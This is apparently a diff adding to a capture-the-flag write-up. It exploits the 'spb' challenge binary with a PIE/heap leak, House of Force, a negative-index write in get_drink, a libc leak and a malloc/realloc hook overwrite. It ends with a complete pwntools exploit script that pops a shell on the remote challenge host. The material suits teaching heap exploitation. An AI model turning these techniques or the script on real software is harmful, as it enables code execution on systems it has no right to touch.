@@ -127,3 +127,195 @@ A negative value is onto the topchunk size field, which gives us House of force 
 ```py 
 Reference: https://heap-exploitation.dhavalkapil.com/attacks/house_of_force.html
 ```
+
+In the sing song function malloc returns the pointer to a bss variable ```c *selected_song```
+Which contains a pie address when the program runs. This leaks the PIE,
+
+Getting heap leak was simple
+Allocate a normal chunk and print the address of the chunk using selected_song function again.
+
+Using house of force, We get the heap to bss.
+```py
+def return_size(target, wilderness):
+    return target - wilderness - 0x10
+```
+The helper function to return the bad size which will be passed to malloc.
+
+We fully control the bss now.
+
+I overwrote the partysize to a big value.
+
+### The get_drink() function is quiet intresting
+```c
+00000a9a  puts(data_f7f)  {"What party member is buying?"}
+00000aab  printf(data_f5f)
+00000ac3  int32_t var_18
+00000ac3  __isoc99_scanf(data_f9c, &var_18)
+00000ad2  _IO_getc(stdin)
+00000ae0  if (var_18 u>= *party_size)
+00000aeb      puts(data_f9f)  {"That member doesn't exist."}
+00000afc  else
+00000afc      puts(data_fba)  {"What are you buying?"}
+00000b08      puts(data_fcf)  {"0. Water"}
+00000b14      puts(data_fd8)  {"1. Pepsi"}
+00000b20      puts(data_fe1)  {"2. Club Mate"}
+00000b2c      puts(data_fee)  {"3. Leninade"}
+00000b3d      printf(data_f5f)
+00000b55      int32_t var_14
+00000b55      __isoc99_scanf(data_ffa, &var_14)
+00000b64      _IO_getc(stdin)
+00000b6c      if (var_14 s<= 3)
+00000b97          *(*party + (zx.q(var_18) << 5) + 0x18) = sx.q(var_14) 
+00000b78      else
+00000b78          puts(data_ffd)  {"We don't have that drink."}
+```
+The get drink function first takes unsigned integer.
+
+And it checks if the input integer is greater or equal to the party size.
+If it is then it's terminates the function.
+When we get our heap transfered to bss.
+There is a topchunk size field on bss.
+
+The else part of this code does is it scans an integer, and checks if it is less than equals to 3.
+### We can give negative values here. (;
+The later part will write the value we gave to the address of *party + `blablamath` 
+We can change the top chunk size here By just calculating offset with trial and error.
+
+First i changed the top chunk size to 0.
+
+and allocate a big chunk of size `py 
+0x210000
+`
+The chunk we will recieve will be mmaped chunk. Right before libcbase, ALIGNED.
+Selected song contains the address of this mmaped chunk.
+We leak libc.
+Now we change the Top chunk again to -1.
+HOUSE OF FORCE PRIMITIVE AGAIN.
+
+I change malloc hook to some where inside realloc and realloc hook to onegaget.
+
+And pop the shell.
+
+```py
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template --host challenge.rgbsec.xyz --port 6969 ./spb
+from pwn import *
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('./spb')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+# ./exploit.py GDB HOST=example.com PORT=4141
+host = args.HOST or 'challenge.rgbsec.xyz'
+port = int(args.PORT or 6969)
+
+def local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return local(argv, *a, **kw)
+    else:
+        return remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Full RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      PIE enabled
+
+io = start()
+
+def init(size, name):
+    io.recvuntil('> ')
+    io.sendline(str(size))
+    io.recvuntil('> ')
+    io.sendline(name)
+
+def getleak():
+    io.recvuntil('> ')
+    io.sendline('3')
+
+def choose(size, data):
+    io.recvuntil('> ')
+    io.sendline('1')
+    io.recvuntil('> ')
+    io.sendline(str(size))
+    io.recvuntil('> ')
+    io.sendline(data)
+
+def getdrink(member, fuck):
+    io.recvuntil('> ')
+    io.sendline('2')
+    io.recvuntil('> ')
+    io.sendline(str(member))
+    io.recvuntil('> ')
+    io.sendline(str(fuck))
+
+def return_size(target, wilderness):
+    return target - wilderness - 0x10
+
+init(0, 'H'*0x17)
+io.sendline()
+getleak()
+io.recvuntil('You sang ')
+pie = int(io.recvn(14), 0) - 0xf08
+log.info('Pie leak {}'.format(hex(pie)))
+choose(0x18, 'K'*0x17)
+io.sendline()
+getleak()
+io.recvuntil('You sang ')
+heap = int(io.recvn(14), 0)
+log.info('Heap leak {}'.format(hex(heap)))
+target_address = pie + 0x202040
+choose(return_size(target_address, heap + 0x10), 'A')
+choose(0x110, p64(pie + 0x202050) + p64(0x7f7f7f7f7f7f7f7f))
+getdrink(8, 0)
+choose(0x210000, 'AAAA')
+getleak()
+io.recvuntil('You sang ')
+libc.address = int(io.recvn(14), 0) + 0x210ff0
+log.info('Libc leak {}'.format(hex(libc.address)))
+getdrink(8, -1)
+target2 = libc.sym.__realloc_hook - 0x8
+choose(return_size(target2, pie + 0x202168), 'BBBBBBBB')
+def attack(size, data):
+    io.recvuntil('> ')
+    io.sendline('1')
+    io.recvuntil('> ')
+    io.sendline(str(size))
+choose(0x110, p64(libc.address + 0x4f3c2) + p64(libc.address + 0x10a45c ) + p64(libc.sym.realloc + 8) + 'AAAAAAA')
+#pause()
+attack(0x100, 'A')
+io.interactive()
+```
+
+### thanks
